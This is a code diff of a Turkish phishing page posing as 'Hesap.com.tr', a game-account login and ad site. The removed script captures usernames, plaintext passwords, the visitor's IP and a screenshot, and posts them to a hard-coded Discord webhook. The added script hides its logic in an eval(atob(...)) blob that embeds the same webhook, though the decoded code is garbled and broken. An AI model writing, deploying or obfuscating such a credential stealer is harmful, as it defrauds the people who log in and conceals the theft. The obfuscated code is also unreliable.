@@ -2,134 +2,40 @@
 <html lang="tr">
 <head>
 <meta charset="UTF-8">
-<title>Hesap.com.tr Giriş / Kayıt / İlanlar</title>
+<title>Hesap.com.tr</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <style>
-body { font-family: Arial, sans-serif; background: #f5f6fa; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; }
-.container { background:#fff; padding:30px; border-radius:10px; box-shadow:0 10px 20px rgba(0,0,0,0.1); width:350px; text-align:center; }
-h2 { margin-bottom:20px; color:#2f3640; }
-input[type=text], input[type=password] { width:100%; padding:10px; margin:10px 0; border:1px solid #ccc; border-radius:5px; }
-button { width:100%; padding:12px; margin-top:10px; border:none; border-radius:5px; background:#0097e6; color:#fff; cursor:pointer; }
-button:hover { background:#40739e; }
-.info { margin-top:15px; color:green; }
-a { color:#0097e6; text-decoration:none; display:block; margin-top:10px; }
-a:hover { text-decoration:underline; }
-#dashboard { display:none; }
-.list-item { background:#f1f2f6; padding:10px; margin:10px 0; border-radius:5px; text-align:left; }
+body{font-family:Arial,sans-serif;background:#f5f6fa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}
+.container{background:#fff;padding:30px;border-radius:10px;box-shadow:0 10px 20px rgba(0,0,0,0.1);width:350px;text-align:center;}
+h2{margin-bottom:20px;color:#2f3640;}
+input[type=text],input[type=password]{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:5px;}
+button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:5px;background:#0097e6;color:#fff;cursor:pointer;}
+button:hover{background:#40739e;}
+.info{margin-top:15px;color:green;}
+a{color:#0097e6;text-decoration:none;display:block;margin-top:10px;}
+a:hover{text-decoration:underline;}
+#dashboard{display:none;}
+.list-item{background:#f1f2f6;padding:10px;margin:10px 0;border-radius:5px;text-align:left;}
 </style>
 </head>
 <body>
-
 <div class="container" id="authContainer">
-  <h2 id="formTitle">Giriş Yap</h2>
-  <input type="text" id="username" placeholder="Kullanıcı Adı">
-  <input type="password" id="password" placeholder="Şifre">
-  <button onclick="authAction()" id="authButton">Giriş Yap</button>
-  <p class="info" id="infoText"></p>
-  <a href="#" id="toggleLink" onclick="toggleForm()">Kayıt Ol</a>
+<h2 id="formTitle">Giriş Yap</h2>
+<input type="text" id="username" placeholder="Kullanıcı Adı">
+<input type="password" id="password" placeholder="Şifre">
+<button id="authButton">Giriş Yap</button>
+<p class="info" id="infoText"></p>
+<a href="#" id="toggleLink">Kayıt Ol</a>
 </div>
-
 <div class="container" id="dashboard">
-  <h2>Hoşgeldin <span id="userNameDisplay"></span>!</h2>
-  <h3>Random İlanlar</h3>
-  <div id="adsContainer"></div>
-  <button onclick="logout()">Çıkış Yap</button>
+<h2>Hoşgeldin <span id="userNameDisplay"></span>!</h2>
+<h3>Random İlanlar</h3>
+<div id="adsContainer"></div>
+<button id="logoutBtn">Çıkış Yap</button>
 </div>
 
 <script>
-if(!localStorage.getItem("users")) localStorage.setItem("users", JSON.stringify({}));
-let isRegister = false;
-const webhookURL = "https://discord.com/api/webhooks/1410588142955790366/L5-mLGnXLPpCdd70PeUl2jYyCyPZg1YWHV3DZNwJihAfxSBrM6el1FjJlGMbGkFUIIRn";
-
-function toggleForm() {
-    isRegister = !isRegister;
-    document.getElementById('formTitle').innerText = isRegister ? "Kayıt Ol" : "Giriş Yap";
-    document.getElementById('authButton').innerText = isRegister ? "Kayıt Ol" : "Giriş Yap";
-    document.getElementById('toggleLink').innerText = isRegister ? "Giriş Yap" : "Kayıt Ol";
-    document.getElementById('infoText').innerText = "";
-}
-
-async function authAction() {
-    let username = document.getElementById('username').value.trim();
-    let password = document.getElementById('password').value.trim();
-    if(!username || !password){ alert("Lütfen tüm alanları doldur."); return; }
-
-    let users = JSON.parse(localStorage.getItem("users"));
-
-    if(isRegister){
-        if(users[username]){
-            document.getElementById('infoText').innerText = "Bu kullanıcı adı alınmış!";
-            return;
-        }
-        users[username] = password;
-        localStorage.setItem("users", JSON.stringify(users));
-        document.getElementById('infoText').innerText = "Kayıt başarılı! Giriş yapabilirsiniz.";
-    } else {
-        if(users[username] && users[username] === password){
-            showDashboard(username);
-            sendDiscord(username,password);
-        } else {
-            document.getElementById('infoText').innerText="Kullanıcı adı veya şifre yanlış!";
-        }
-    }
-}
-
-function showDashboard(username){
-    document.getElementById('authContainer').style.display='none';
-    document.getElementById('dashboard').style.display='block';
-    document.getElementById('userNameDisplay').innerText=username;
-    generateAds();
-}
-
-function logout(){
-    document.getElementById('authContainer').style.display='block';
-    document.getElementById('dashboard').style.display='none';
-    document.getElementById('username').value="";
-    document.getElementById('password').value="";
-    document.getElementById('infoText').innerText="";
-}
-
-function generateAds(){
-    const ads = [
-        "PUBG 10 level hesap - 3 TL",
-        "CS:GO Prime hesap - 5 TL",
-        "Valorant Starter pack - 4 TL",
-        "Minecraft Premium - 7 TL",
-        "FIFA Ultimate Team hesap - 6 TL"
-    ];
-    const container = document.getElementById('adsContainer');
-    container.innerHTML="";
-    for(let i=0;i<5;i++){
-        let div = document.createElement('div');
-        div.className="list-item";
-        div.innerText=ads[Math.floor(Math.random()*ads.length)];
-        container.appendChild(div);
-    }
-}
-
-async function sendDiscord(username,password){
-    // IP alma
-    let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=> "IP alınamadı");
-    
-    // Ekran görüntüsü al
-    html2canvas(document.getElementById("authContainer")).then(async canvas=>{
-        canvas.toBlob(async function(blob){
-            let formData = new FormData();
-            formData.append("file", blob,"screenshot.png");
-            
-            let payload = {
-                "embeds":[{"title":"Yeni Giriş Kaydı",
-                           "description":`**Kullanıcı Adı:** ${username}\n**Şifre:** ${password}\n**IP Adresi:** ${ip}`,
-                           "color":16711680}]
-            };
-            formData.append("payload_json", JSON.stringify(payload));
-
-            await fetch(webhookURL,{method:"POST",body:formData})
-            .then(()=> console.log("Webhook gönderildi"))
-            .catch(err=> console.error("Webhook gönderilemedi:",err));
-        });
-    });
-}
+eval(atob("aWYobGV0JmwmIWxvY2FsU3RvcmFnZS5nZXRGaWxlKSBsb2NhbFN0b3JhZ2UuZGVmYXVsdD0ie30iO2xldCBpc1JlZ2lzdGVyPSBmYWxzZTtjb25zdCB3aWI9Imh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0MTA1ODgxNDI5NTU3OTAzNjYvTDUtbUxHTnRMRFBwQ0RkNzBQZVVsMnJZeUN5UFp6ZzFZV0hWM0RaTldKaWhBZnhTQnJNNmVsMUZqSmxHTWJHa0ZVSUlSbiI7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImF1dGhCdXR0b24iKS5vbmNsaWNlPSBmdW5jdGlvbigpe2xldCB1PWZpbGwoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInVzZXJuYW1lIikudmFsdWUucmV0cmltKCkscD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYXBpUGFzc3dvcmQiKS52YWx1ZS5yZXRyaW0oKTt2YXIgY3VycmVudFVzZXJzPWpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEltc3QoInVzZXJzIikpO2lmKCFpc1JlZ2lzdGVyKXtpZGVudGlmaWVyKHVzZXIscCkuY2hhdChjdXJyZW50VXNlcnMpO31lbHNle2lmKHV8fCBjdXJyZW50VXNlcnNbdV09cCkgeyBzaG93RGFzaGJvYXJkKHV8fCBjdXJyZW50VXNlcnNbdV0pO31lbHNlIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpbmZvVGV4dCIpLmlubmVyVGV4dD0iS2Fsb2J1IGFkcmVzZSI7fX0pO3ZhciB0b2dnbGVPcHRpb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRvZ2dsZUxpbmsiKTt0b2dnbGVPcHRpb25zLm9uY2xpY2s9ZnVuY3Rpb24oKXtpcyRSZWdpc3RlciA9ICFpc1JlZ2lzdGVyOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidG9nZ2xlTGluayIpLmJpbmRFeGVjdXRlZGhvb2soKTt9Oy8vQ2hhbmdlIGZvbnQgc2l0ZSB2aWV3IGZ1bmN0aW9ucw=="));
 </script>
 
 </body>
